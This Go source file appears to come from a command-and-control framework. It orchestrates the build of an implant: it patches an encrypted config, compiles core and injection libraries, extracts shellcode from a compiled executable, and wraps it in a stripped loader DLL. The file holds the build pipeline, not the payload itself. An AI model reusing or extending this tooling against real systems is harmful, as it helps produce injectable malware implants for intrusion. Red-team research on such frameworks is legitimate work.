package core

import (
	"fmt"
	"os"
	"path"
	"time"
)

var (
	LinkerLoader 	= LoaderPath + "/linker.loader.ld"
	HashStrings 	= ConfigsPath + "/strings.txt"
	DllMain   		= LoaderPath + "/dllmain.cpp"
	RsrcScript  	= LoaderPath + "/resource.rc"
	HashHedaer 		= IncludePath + "/names.hpp"
)

func (h *HexaneConfig) RunBuild() error {
	var err error

	if err = h.BuildUpdate(); err != nil {
		return err
	}

	go h.HttpServerHandler()
	time.Sleep(time.Millisecond * 500)

	return nil
}

func (h *HexaneConfig) GenerateConfig() error {
	var (
		Patch []byte
		Xtea  []byte
		err   error
	)

	h.Key = nil
	h.Key = CryptCreateKey(16)

	if Patch, err = h.PePatchConfig(); err != nil {
		return err
	}

	// Patch = XteaCrypt()
	Xtea = Patch

	h.ConfigBytes = Xtea
	return nil
}

func (h *HexaneConfig) GenerateLoader() error {
	var (
		err error
		injectCfg *InjectConfig
	)

	RsrcObj := h.Compiler.BuildDirectory + "/resource.res"
	RsrcData := h.Compiler.BuildDirectory + "/shellcode.bin"
	CoreCpp := h.Compiler.BuildDirectory + "/ldrcore.cpp"
	CoreComponents := h.Compiler.BuildDirectory + "/ldrcore.cpp.o"
	Output := h.Compiler.BuildDirectory + "/" + h.ImplantName + h.Compiler.FileExtension


	WrapMessage("DBG", "generating loader config")
	if injectCfg, err = h.GetInjectConfig(); err != nil {
		return err
	}

	WrapMessage("DBG", "generating strings config")
	injectCfg.InjectConfig = h.GetEmbededStrings(injectCfg.Strings)

	if err = h.RunCommand(h.Compiler.Windres + " -O coff " + RsrcScript + " -DRSRCDATA=\"" + RsrcData + "\" -o " + RsrcObj); err != nil {
		return err
	}

	WrapMessage("DBG", "compiling execute object")
	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{CoreCpp, injectCfg.ExecuteObj}, nil, h.Compiler.IncludeDirs, nil, CoreComponents); err != nil {
		return err
	}

	Components := []string{
		DllMain,
		RsrcObj,
		CoreComponents,
	}

	WrapMessage("DBG", "compiling final dll")
	if err = h.CompileObject(h.Compiler.Linker+" -T "+LinkerLoader, Components, []string{"-shared"}, h.Compiler.IncludeDirs, nil, Output); err != nil {
		return err
	}

	WrapMessage("DBG", "embeding strings config into loader dll")
	if err = h.EmbedSectionData(Output, ".text$G", injectCfg.InjectConfig); err != nil {
		return err
	}

	if !h.Compiler.Debug {
		WrapMessage("DBG", "stripping symbols")
		if err = h.RunCommand(h.Compiler.Strip + " " + Output); err != nil {
			return err
		}
	}

	return nil
}


func (h *HexaneConfig) GenerateLibs(rootPath string, srcPath string, incPath string, tmpPath string, linker string, libName string) error {
	var (
		buildFiles 	[]string
		flags 		[]string
		files 		[]os.DirEntry
		err   		error
	)


	if err = CreateTemp(tmpPath); err != nil {
		return err
	}

	if files, err = FindFiles(srcPath); err != nil {
		return err
	}

	if linker != "" {
		flags = append(h.Compiler.Flags, " -T ",linker)
	} else {
		flags = h.Compiler.Flags
	}

	for _, file := range files {

		objFile := tmpPath + "/" + file.Name() + ".o"
		Append := false


		if path.Ext(file.Name()) == ".cpp" {
			if err = h.CompileObject(h.Compiler.Mingw + " -c ", []string{file.Name()}, flags, []string{incPath}, nil, objFile); err != nil {
				return err
			}

			Append = true
		}

		if path.Ext(file.Name()) == ".asm" {
			if err = h.CompileObject(h.Compiler.Assembler+" -f win64 ", []string{file.Name()}, nil, nil, nil, objFile); err != nil {
				return err
			}

			Append = true
		}

		if Append {
			buildFiles = append(buildFiles, objFile)
		}
	}

	if err = h.CompileObject("ar", buildFiles, []string{"rcs"}, []string{incPath}, nil, rootPath + "/" + libName); err != nil {
		return err
	}

	return nil
}

func (h *HexaneConfig) BuildUpdate() error {
	var (
		err error
	)

	WrapMessage("INF", "starting build...")
	if err = os.MkdirAll(h.Compiler.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	WrapMessage("INF", "generating config")
	if err = h.GenerateConfig(); err != nil {
		return err
	}

	WrapMessage("INF", "generating hashes")
	if err = GenerateHashes(HashStrings, HashHedaer); err != nil {
		return err
	}

	WrapMessage("INF", "generating core components")
	if !SearchFile(Corelib, "corelib.a") {
		if err = h.GenerateLibs(Corelib, Corelib+"/src", Corelib+"/include", Corelib, Corelib+"/corelib.ld", "corelib.a"); err != nil {
			return err
		}
	}

	if h.Implant.Injection != nil {
		if err = h.GenerateLibs(Injectlib, Injectlib+"/src", Injectlib+"/include", h.Compiler.BuildDirectory+"/build", Injectlib+"/injectlib.ld", h.Compiler.BuildDirectory+"injectlib.a"); err != nil {
			return err
		}
	}

	WrapMessage("INF", "generating shellcode")
	if err = h.CopySectionData(h.Compiler.BuildDirectory + "/interm.exe", h.Compiler.BuildDirectory + "/shellcode.bin", ".text"); err != nil {
		return err
	}

	if h.BuildType == "dll" {
		WrapMessage("INF", "generating dll loader")
		if err = h.GenerateLoader(); err != nil {
			return err
		}
	}

	AddConfig(h)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.ImplantName))

	return nil
}
